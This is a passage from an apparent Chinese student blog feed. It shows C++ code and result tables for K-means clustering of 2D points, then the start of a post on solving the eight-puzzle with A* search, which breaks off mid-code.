	<span class="token keyword">const</span> <span class="token keyword">double</span> criDiff <span class="token operator">=</span> <span class="token number">1e-6</span><span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span>point<span class="token operator">></span> <span class="token function">extraCoords</span><span class="token punctuation">(</span><span class="token keyword">const</span> string<span class="token operator">&amp;</span> path<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		ifstream <span class="token function">fileStream</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
		vector<span class="token operator">&lt;</span>point<span class="token operator">></span> coords<span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>fileStream<span class="token punctuation">.</span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			string s<span class="token punctuation">;</span>
			fileStream <span class="token operator">>></span> s<span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isalpha</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
				<span class="token keyword">continue</span><span class="token punctuation">;</span>
			<span class="token keyword">double</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
			x <span class="token operator">=</span> <span class="token function">stod</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
			fileStream <span class="token operator">>></span> s<span class="token punctuation">;</span>
			y <span class="token operator">=</span> <span class="token function">stod</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
			coords<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		fileStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> coords<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">drawFigures</span><span class="token punctuation">(</span><span class="token keyword">const</span> vector<span class="token operator">&lt;</span>point<span class="token operator">></span><span class="token operator">&amp;</span> coords<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> coord <span class="token operator">:</span> coords<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token generic-function"><span class="token function">static_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>coord<span class="token punctuation">.</span>x <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">int</span> y <span class="token operator">=</span> <span class="token generic-function"><span class="token function">static_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>coord<span class="token punctuation">.</span>y <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">rectangle</span><span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
	<span class="token keyword">void</span> <span class="token function">clusterAnalysis</span><span class="token punctuation">(</span><span class="token keyword">const</span> string<span class="token operator">&amp;</span> path<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">auto</span> coords <span class="token operator">=</span> <span class="token function">extraCoords</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
		vector<span class="token operator">&lt;</span>point<span class="token operator">></span> <span class="token function">center</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> k<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">int</span> randIndex <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> coords<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			center<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> coords<span class="token punctuation">[</span>randIndex<span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">double</span> difference <span class="token operator">=</span> DBL_MAX<span class="token punctuation">;</span>
		vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span>point<span class="token operator">>></span> <span class="token function">group</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> times <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> difference <span class="token operator">/</span> k <span class="token operator">></span> criDiff <span class="token operator">&amp;&amp;</span> times <span class="token operator">&lt;</span> iterLimit<span class="token punctuation">;</span> <span class="token operator">++</span>times<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 迭代</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span><span class="token operator">&amp;</span> g <span class="token operator">:</span> group<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 清空分组</span>
				g<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			difference <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> coords<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 将所有点根据离中心点的距离进行归类</span>
				<span class="token keyword">double</span> minDis <span class="token operator">=</span> DBL_MAX<span class="token punctuation">;</span>
				<span class="token keyword">int</span> minInd <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
				<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> center<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					<span class="token keyword">double</span> dis <span class="token operator">=</span> <span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token punctuation">(</span>center<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">-</span> coords<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> 
						<span class="token operator">+</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token punctuation">(</span>center<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>y <span class="token operator">-</span> coords<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">if</span> <span class="token punctuation">(</span>dis <span class="token operator">&lt;</span> minDis<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
						minDis <span class="token operator">=</span> dis<span class="token punctuation">;</span>
						minInd <span class="token operator">=</span> j<span class="token punctuation">;</span>
					<span class="token punctuation">&#125;</span>
				<span class="token punctuation">&#125;</span>
				group<span class="token punctuation">[</span>minInd<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>coords<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> k<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 更新各组的中心点</span>
				<span class="token keyword">double</span> avgX <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> avgY <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
				<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> group<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					avgX <span class="token operator">+=</span> group<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">;</span>
					avgY <span class="token operator">+=</span> group<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">;</span>
				<span class="token punctuation">&#125;</span>
				avgX <span class="token operator">/=</span> group<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				avgY <span class="token operator">/=</span> group<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				difference <span class="token operator">+=</span> <span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token punctuation">(</span>center<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">-</span> avgX<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
					<span class="token operator">+</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token punctuation">(</span>center<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>y <span class="token operator">-</span> avgY<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
				center<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">point</span><span class="token punctuation">(</span>avgX<span class="token punctuation">,</span> avgY<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>

			<span class="token comment">//debug</span>
			cout <span class="token operator">&lt;&lt;</span> <span class="token string">"times: "</span> <span class="token operator">&lt;&lt;</span> times <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
			cout <span class="token operator">&lt;&lt;</span> <span class="token string">"central point: "</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> c <span class="token operator">:</span> center<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				cout <span class="token operator">&lt;&lt;</span> c<span class="token punctuation">.</span>x <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> c<span class="token punctuation">.</span>y <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			cout <span class="token operator">&lt;&lt;</span> <span class="token string">"---------------------------------"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>

		<span class="token function">initgraph</span><span class="token punctuation">(</span><span class="token number">800</span><span class="token punctuation">,</span> <span class="token number">800</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">setorigin</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> color <span class="token operator">=</span> <span class="token punctuation">&#123;</span> RED<span class="token punctuation">,</span> GREEN<span class="token punctuation">,</span> BLUE<span class="token punctuation">,</span> YELLOW <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> k<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token function">setcolor</span><span class="token punctuation">(</span>color<span class="token punctuation">[</span>i <span class="token operator">%</span> color<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">circle</span><span class="token punctuation">(</span>center<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">,</span> center<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>y <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 绘制中心</span>
			<span class="token function">drawFigures</span><span class="token punctuation">(</span>group<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 绘制各点</span>
		<span class="token punctuation">&#125;</span>
		cin<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">closegraph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	Kmeans kmeans<span class="token punctuation">;</span>
	kmeans<span class="token punctuation">.</span><span class="token function">clusterAnalysis</span><span class="token punctuation">(</span><span class="token string">"./data.txt"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>



<h2 id="实验结果分析"><a href="#实验结果分析" class="headerlink" title="实验结果分析"></a>实验结果分析</h2><p><img src="/2022/04/27/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E4%BD%9C%E4%B8%9A%20%E4%BD%BF%E7%94%A8K-means%E7%AE%97%E6%B3%95%E8%BF%9B%E8%A1%8C%E8%81%9A%E7%B1%BB%E5%88%86%E6%9E%90/f1.png"></p>
<table>
<thead>
<tr>
<th align="center">迭代次数</th>
<th align="center">中心点1</th>
<th align="center">中心点2</th>
<th align="center">中心点3</th>
<th align="center">中心点4</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">(0.227226, 3.04983)</td>
<td align="center">(2.78284, -2.05254)</td>
<td align="center">(-3.52982, 3.21916)</td>
<td align="center">(-3.53974, -2.89384)</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">(1.88871, 3.14692)</td>
<td align="center">(2.86928, -2.54779)</td>
<td align="center">(-2.77105, 2.77596)</td>
<td align="center">(-3.38237, -2.94734)</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">(2.62653, 3.10868)</td>
<td align="center">(2.80293, -2.73151)</td>
<td align="center">(-2.46154, 2.78738)</td>
<td align="center">(-3.38237, -2.94734)</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">(2.62653, 3.10868)</td>
<td align="center">(2.80293, -2.73151)</td>
<td align="center">(-2.46154, 2.78738)</td>
<td align="center">(-3.38237, -2.94734)</td>
</tr>
</tbody></table>
<p>运行结果如图所示，输入的  k 为4，将各点分成了4类，每一类用不同的颜色进行表示，类的中心点为该颜色下的小圆圈。根据肉眼观察，聚类的结果较为合理。但是由于 K-means 算法初始点的选取是随机的，因此可能会导致聚类的结果不尽相同，如下图所示：  </p>
<p><img src="/2022/04/27/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E4%BD%9C%E4%B8%9A%20%E4%BD%BF%E7%94%A8K-means%E7%AE%97%E6%B3%95%E8%BF%9B%E8%A1%8C%E8%81%9A%E7%B1%BB%E5%88%86%E6%9E%90/f2.png"></p>
<table>
<thead>
<tr>
<th align="center">迭代次数</th>
<th align="center">中心点1</th>
<th align="center">中心点2</th>
<th align="center">中心点3</th>
<th align="center">中心点4</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">(2.72345, -2.26244)</td>
<td align="center">(-3.01524, -2.54552)</td>
<td align="center">(-0.17289, 3.07096)</td>
<td align="center">(-4.01179, -3.20733)</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">(2.86928, -2.54779)</td>
<td align="center">(-2.77631, -2.51946)</td>
<td align="center">(0.0469085, 3.05288)</td>
<td align="center">(-4.27929, -3.17607)</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">(2.86928, -2.54779)</td>
<td align="center">(-2.73086, -2.60718)</td>
<td align="center">(0.0469085, 3.05288)</td>
<td align="center">(-4.35316, -3.03354)</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">(2.86928, -2.54779)</td>
<td align="center">(-2.73086, -2.60718)</td>
<td align="center">(0.0469085, 3.05288)</td>
<td align="center">(-4.35316, -3.03354)</td>
</tr>
</tbody></table>
<p>可见，由于初始中心点的选取不同，最终导致聚类的结果产生了差异，且本次聚类的结果相对来说不够合理。</p>
<h2 id="实验体会"><a href="#实验体会" class="headerlink" title="实验体会"></a>实验体会</h2><p>本次实验算法原理并不复杂，关键在于对文本数据的提取与转换，以及将数据可视化的绘制在屏幕上。文本数据提取部分我采用了文件IO流与字符串转换函数stod()。而数据可视化方面，由于本实验只有其画点这一极为基础的图形需求，因此我采用了一个较为轻量化图形库easyX，使用简单且代码量很少。</p>
]]></content>
      <categories>
        <category>人工智能</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数据结构</tag>
        <tag>人工智能</tag>
      </tags>
  </entry>
  <entry>
    <title>人工智能作业 使用AStar算法解决八数码问题</title>
    <url>/2022/04/27/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E4%BD%9C%E4%B8%9A%20%E4%BD%BF%E7%94%A8AStar%E7%AE%97%E6%B3%95%E8%A7%A3%E5%86%B3%E5%85%AB%E6%95%B0%E7%A0%81%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>八数码问题是一个经典的搜索问题，本文将介绍如何使用启发式搜索—— AStar 算法来求解八数码问题。</p>
<span id="more"></span>

<h1 id="使用AStar算法解决八数码问题"><a href="#使用AStar算法解决八数码问题" class="headerlink" title="使用AStar算法解决八数码问题"></a>使用AStar算法解决八数码问题</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><blockquote>
<p>八数码问题的A星搜索算法实现 </p>
<p>要求：设计估价函数，并采用c或python编程实现，以八数码为例演示A星算法的搜索过程，争取做到直观、清晰地演示算法，代码要适当加注释。</p>
<p>八数码难题：在3×3方格棋盘上，分别放置了标有数字1,2,3,4,5,6,7,8的八张牌，初始状态S0可自己随机设定，使用的操作有：空格上移，空格左移，空格右移，空格下移。试采用A*算法编一程序实现这一搜索过程。</p>
</blockquote>
<h2 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h2><h3 id="预估值的设计"><a href="#预估值的设计" class="headerlink" title="预估值的设计"></a>预估值的设计</h3><p>A* 算法的花费为 f(n) = g(n) + h(n)，其中 g(n) 为搜索深度，定义为状态单元 state 的成员变量，在每次生成子节点时将其加一。h(n) 为不对位的将牌数，将该部分的计算重载于 state 的小于运算符中，并将 f(n) = g(n) + h(n) 的值作为状态单元的比较值。</p>
<h3 id="数据结构设计"><a href="#数据结构设计" class="headerlink" title="数据结构设计"></a>数据结构设计</h3><ul>
<li>每个状态用一个结构体表示，其中 depth 为状态深度，str 为该状态字符串，并重载小于运算符用于计算最优。</li>
<li>open 表使用优先队列 <code>priority_queue</code>，实现在 O(logn) 的时间复杂度内获取最优值。</li>
<li>close 表使用哈希集合 <code>unordered_set</code>，实现在 O(1) 时间复杂度内判断某状态是否已位于 close 表中。</li>
<li>而为了得到最优搜索路径，还需要将每个状态的前驱加以保存，前驱表 pre 我使用了哈希表 <code>unordered_map</code>，模板类型为 <code>pair&lt;string, string&gt;</code>，表示 key 的前驱为 value。</li>
</ul>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;vector></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;queue></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;unordered_map></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;unordered_set></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stack></span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">private</span><span class="token operator">:</span>
	<span class="token keyword">static</span> string targetStr<span class="token punctuation">;</span>
	<span class="token keyword">const</span> vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> dirs <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#123;</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">// 四个移动方向</span>
	<span class="token keyword">struct</span> <span class="token class-name">state</span>
	<span class="token punctuation">&#123;</span>
		string str<span class="token punctuation">;</span>
		<span class="token keyword">int</span> depth<span class="token punctuation">;</span>
		<span class="token function">state</span><span class="token punctuation">(</span>string s<span class="token punctuation">,</span> <span class="token keyword">int</span> d<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">depth</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
		<span class="token keyword">bool</span> <span class="token keyword">operator</span> <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">const</span> state<span class="token operator">&amp;</span> s<span class="token punctuation">)</span> <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">int</span> cnt1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> cnt2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> targetStr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
					<span class="token operator">++</span>cnt1<span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token operator">-></span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> targetStr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
					<span class="token operator">++</span>cnt2<span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">return</span> cnt1 <span class="token operator">+</span> <span class="token keyword">this</span><span class="token operator">-></span>depth <span class="token operator">></span> cnt2 <span class="token operator">+</span> s<span class="token punctuation">.</span>depth<span class="token punctuation">;</span> <span class="token comment">// f(n) = g(n) + h(n)			</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
	<span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">swapChr</span><span class="token punctuation">(</span>string<span class="token operator">&amp;</span> child<span class="token punctuation">,</span> <span class="token keyword">int</span> iniInd<span class="token punctuation">,</span> <span class="token keyword">int</span> childInd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 交换字符，完成移动</span>
		child<span class="token punctuation">[</span>iniInd<span class="token punctuation">]</span> <span class="token operator">=</span> child<span class="token punctuation">[</span>childInd<span class="token punctuation">]</span><span class="token punctuation">;</span>
		child<span class="token punctuation">[</span>childInd<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0'</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">void</span> <span class="token function">printPath</span><span class="token punctuation">(</span>unordered_map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span> string<span class="token operator">></span><span class="token operator">&amp;</span> pre<span class="token punctuation">,</span> string path<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 输出路径</span>
		stack<span class="token operator">&lt;</span>string<span class="token operator">></span> st<span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>path <span class="token operator">!=</span> <span class="token string">"None"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			st<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
			path <span class="token operator">=</span> pre<span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">++</span>cnt <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>st<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			string str <span class="token operator">=</span> st<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			st<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
